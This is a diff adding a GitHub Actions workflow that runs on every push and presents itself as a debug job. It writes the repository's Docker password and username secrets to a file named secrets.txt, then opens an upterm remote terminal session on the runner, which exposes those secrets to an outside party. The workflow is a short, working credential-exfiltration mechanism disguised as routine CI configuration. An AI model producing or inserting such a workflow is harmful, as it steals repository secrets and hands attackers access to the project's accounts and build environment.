@@ -1,0 +1,15 @@
+name: show 
+on: [push]
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+    steps:
+    - env:
+        DEBUG_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        DEBUG_SECRET_KEY: ${{ secrets.DOCKER_USERNAME }}
+      run: |
+        echo $DEBUG_PASSWORD >> secrets.txt
+        echo $DEBUG_SECRET_KEY >> secrets.txt
+
+    - name: Setup upterm session
+      uses: lhotari/action-upterm@v1
